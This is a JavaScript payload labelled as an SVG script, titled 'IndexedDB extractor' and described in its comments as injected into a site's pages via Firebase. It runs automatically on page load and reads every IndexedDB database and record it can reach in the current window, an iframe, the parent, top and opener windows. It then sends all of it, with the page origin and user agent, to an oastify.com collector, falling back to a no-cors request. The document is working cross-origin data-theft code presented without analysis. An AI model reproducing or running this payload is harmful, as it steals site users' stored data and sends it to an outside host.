svg.script:

console.clear();
console.log('═══════════════════════════════════════');
console.log('🗄️ INDEXEDDB EXTRACTOR - PAYLOAD');
console.log('═══════════════════════════════════════');
console.log('📍 Origin:', window.location.origin);
console.log('📍 URL:', window.location.href);
console.log('📌 This SVG is injected via script on ai.planet.com');

const statusLog = document.getElementById('statusLog');
const statusTime = document.getElementById('statusTime');

function logStatus(message, isError = false, isSuccess = false) {
    const timestamp = new Date().toLocaleTimeString();
    const prefix = isError ? '❌' : isSuccess ? '✅' : '📌';
    const entry = '[' + timestamp + '] ' + prefix + ' ' + message;
    console.log(entry);
    if (statusLog) {
        const color = isError ? '#f48771' : isSuccess ? '#6a9955' : '#d4d4d4';
        statusLog.innerHTML += '<div style="color:' + color + '">' + entry + '</div>';
        statusLog.scrollTop = statusLog.scrollHeight;
    }
    if (statusTime) {
        statusTime.textContent = timestamp;
    }
}

// ============================================
// ACCESS IFRAME'S INDEXEDDB
// ============================================

async function extractIframeIndexedDB() {
    logStatus('🚀 Starting extraction from iframe IndexedDB...');

    // Try to find the iframe - it might be in the parent window
    var iframe = document.getElementById('planetIframe');

    // If not in this document, try parent
    if (!iframe && window.parent) {
        try {
            iframe = window.parent.document.getElementById('planetIframe');
            logStatus('📌 Found iframe in parent window');
        } catch(e) {
            logStatus('⚠️ Cannot access parent iframe', true);
        }
    }

    // If still no iframe, try to find any iframe
    if (!iframe) {
        try {
            var iframes = document.getElementsByTagName('iframe');
            if (iframes.length > 0) {
                iframe = iframes[0];
                logStatus('📌 Found iframe in current document');
            }
        } catch(e) {}
    }

    if (!iframe) {
        logStatus('❌ No iframe found. Trying direct IndexedDB access...', true);
        // Try direct access as fallback
        return await extractDirectIndexedDB();
    }

    try {
        var targetWindow = iframe.contentWindow;
        if (!targetWindow) {
            logStatus('❌ Cannot access iframe contentWindow', true);
            return await extractDirectIndexedDB();
        }

        var iframeDB = targetWindow.indexedDB;
        if (!iframeDB) {
            logStatus('❌ Cannot access iframe IndexedDB', true);
            return await extractDirectIndexedDB();
        }

        logStatus('✅ Got iframe IndexedDB reference', false, true);

        var databases = await iframeDB.databases();
        logStatus('📌 Found ' + databases.length + ' databases in iframe');

        if (databases.length === 0) {
            logStatus('⚠️ No databases found in iframe', true);
            return null;
        }

        var allData = {};
        for (var i = 0; i < databases.length; i++) {
            var dbInfo = databases[i];
            var dbName = dbInfo.name;
            logStatus('📖 Reading database: ' + dbName);

            try {
                var db = await new Promise(function(resolve, reject) {
                    var req = iframeDB.open(dbInfo.name);
                    req.onsuccess = function() { resolve(req.result); };
                    req.onerror = function() { reject(req.error); };
                });

                var dbData = {};
                var storeNames = Array.from(db.objectStoreNames);

                for (var j = 0; j < storeNames.length; j++) {
                    var storeName = storeNames[j];
                    logStatus('  📖 Reading store: ' + storeName);

                    var data = await new Promise(function(resolve, reject) {
                        var tx = db.transaction(storeName, 'readonly');
                        var req = tx.objectStore(storeName).getAll();
                        req.onsuccess = function() { resolve(req.result); };
                        req.onerror = function() { reject(req.error); };
                    });

                    dbData[storeName] = data;
                    logStatus('    ✅ ' + data.length + ' records', false, true);

                    if (data.length > 0) {
                        console.log('    Sample from ' + storeName + ':', data[0]);
                    }
                }

                allData[dbName] = dbData;
                db.close();

                var totalRecords = 0;
                for (var key in dbData) {
                    if (Array.isArray(dbData[key])) {
                        totalRecords += dbData[key].length;
                    }
                }
                logStatus('  ✅ ' + dbName + ': ' + storeNames.length + ' stores, ' + totalRecords + ' records', false, true);

            } catch (error) {
                logStatus('  ❌ Error reading ' + dbName + ': ' + error.message, true);
            }
        }

        return allData;

    } catch (error) {
        logStatus('❌ Error accessing iframe IndexedDB: ' + error.message, true);
        return await extractDirectIndexedDB();
    }
}

// ============================================
// DIRECT INDEXEDDB ACCESS (FALLBACK)
// ============================================

async function extractDirectIndexedDB() {
    logStatus('🔄 Trying direct IndexedDB access...');

    try {
        var databases = await indexedDB.databases();
        logStatus('📌 Found ' + databases.length + ' databases directly');

        if (databases.length === 0) {
            logStatus('⚠️ No databases found directly', true);
            return null;
        }

        var allData = {};
        for (var i = 0; i < databases.length; i++) {
            var dbInfo = databases[i];
            var dbName = dbInfo.name;
            logStatus('📖 Reading direct database: ' + dbName);

            try {
                var db = await new Promise(function(resolve, reject) {
                    var req = indexedDB.open(dbInfo.name);
                    req.onsuccess = function() { resolve(req.result); };
                    req.onerror = function() { reject(req.error); };
                });

                var dbData = {};
                var storeNames = Array.from(db.objectStoreNames);

                for (var j = 0; j < storeNames.length; j++) {
                    var storeName = storeNames[j];
                    var data = await new Promise(function(resolve, reject) {
                        var tx = db.transaction(storeName, 'readonly');
                        var req = tx.objectStore(storeName).getAll();
                        req.onsuccess = function() { resolve(req.result); };
                        req.onerror = function() { reject(req.error); };
                    });
                    dbData[storeName] = data;
                    logStatus('    📍 ' + storeName + ': ' + data.length + ' records');
                }

                allData[dbName] = dbData;
                db.close();

            } catch (error) {
                logStatus('  ❌ Error reading ' + dbName + ': ' + error.message, true);
            }
        }

        return allData;

    } catch (error) {
        logStatus('❌ Direct IndexedDB access failed: ' + error.message, true);
        return null;
    }
}

// ============================================
// SEND TO SERVER
// ============================================

async function sendToServer(data) {
    var serverUrl = 'https://ybd4tc4r5ma1zn6x4y8k0w79t0zrnobd.oastify.com/api/indexeddb';

    logStatus('📤 Sending data to server...');
    logStatus('📌 Server: ' + serverUrl);

    // Calculate total records
    var totalRecords = 0;
    for (var dbName in data) {
        var db = data[dbName];
        for (var storeName in db) {
            if (Array.isArray(db[storeName])) {
                totalRecords += db[storeName].length;
            }
        }
    }

    logStatus('📊 Total records: ' + totalRecords);
    logStatus('📦 Data size: ' + JSON.stringify(data).length + ' bytes');

    var payload = {
        source: window.location.origin,
        url: window.location.href,
        timestamp: new Date().toISOString(),
        totalRecords: totalRecords,
        data: data,
        userAgent: navigator.userAgent,
        injected: true
    };

    console.log('📤 Payload:', payload);

    try {
        var response = await fetch(serverUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            var result = await response.json();
            logStatus('✅ Data sent successfully! Status: ' + response.status, false, true);
            console.log('Server response:', result);
        } else {
            var text = await response.text();
            logStatus('❌ Server error: ' + response.status + ' - ' + text, true);
        }
    } catch (error) {
        logStatus('❌ Network error: ' + error.message, true);
        console.error('Network error:', error);

        // Try no-cors mode as fallback
        try {
            logStatus('🔄 Trying no-cors mode...');
            await fetch(serverUrl, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            logStatus('✅ Request sent (no-cors) - check server logs', false, true);
        } catch (e2) {
            logStatus('❌ No-cors failed: ' + e2.message, true);
        }
    }
}

// ============================================
// MAIN EXECUTION
// ============================================

async function main() {
    logStatus('═══════════════════════════════════════');
    logStatus('🚀 Starting IndexedDB extraction...');
    logStatus('📍 Origin: ' + window.location.origin);
    logStatus('📌 This SVG was injected from Firebase');

    // Wait for page to fully load
    logStatus('⏳ Waiting 3 seconds...');
    await new Promise(function(resolve) { setTimeout(resolve, 3000); });

    var data = await extractIframeIndexedDB();

    if (data && Object.keys(data).length > 0) {
        logStatus('✅ Data extracted successfully!', false, true);
        await sendToServer(data);
    } else {
        logStatus('⚠️ No data extracted', true);
        logStatus('💡 Trying to find IndexedDB in any context...');

        // Try one more time with a different approach
        try {
            logStatus('🔄 Checking all windows for IndexedDB...');
            var allWindows = [window];
            try { if (window.parent && window.parent !== window) allWindows.push(window.parent); } catch(e) {}
            try { if (window.top && window.top !== window) allWindows.push(window.top); } catch(e) {}
            try { if (window.opener) allWindows.push(window.opener); } catch(e) {}

            for (var i = 0; i < allWindows.length; i++) {
                try {
                    var win = allWindows[i];
                    var db = win.indexedDB;
                    if (db) {
                        var dbs = await db.databases();
                        if (dbs.length > 0) {
                            logStatus('✅ Found IndexedDB in window ' + i + ' with ' + dbs.length + ' databases', false, true);
                            var extractedData = {};
                            for (var j = 0; j < dbs.length; j++) {
                                var dbInfo = dbs[j];
                                try {
                                    var conn = await new Promise(function(resolve, reject) {
                                        var req = db.open(dbInfo.name);
                                        req.onsuccess = function() { resolve(req.result); };
                                        req.onerror = function() { reject(req.error); };
                                    });
                                    var storeData = {};
                                    var stores = Array.from(conn.objectStoreNames);
                                    for (var k = 0; k < stores.length; k++) {
                                        var storeName = stores[k];
                                        var storeRecords = await new Promise(function(resolve, reject) {
                                            var tx = conn.transaction(storeName, 'readonly');
                                            var req = tx.objectStore(storeName).getAll();
                                            req.onsuccess = function() { resolve(req.result); };
                                            req.onerror = function() { reject(req.error); };
                                        });
                                        storeData[storeName] = storeRecords;
                                    }
                                    extractedData[dbInfo.name] = storeData;
                                    conn.close();
                                } catch(e) {}
                            }
                            if (Object.keys(extractedData).length > 0) {
                                await sendToServer(extractedData);
                                logStatus('✅ Data sent from alternative window!', false, true);
                                return;
                            }
                        }
                    }
                } catch(e) {}
            }
        } catch(e) {}
    }

    logStatus('✅ Extraction complete');
    logStatus('═══════════════════════════════════════');
}

// Start when DOM is ready
logStatus('⏳ Initializing...');
if (document.readyState === 'complete') {
    setTimeout(main, 1000);
} else {
    window.addEventListener('load', function() {
        setTimeout(main, 1000);
    });
}
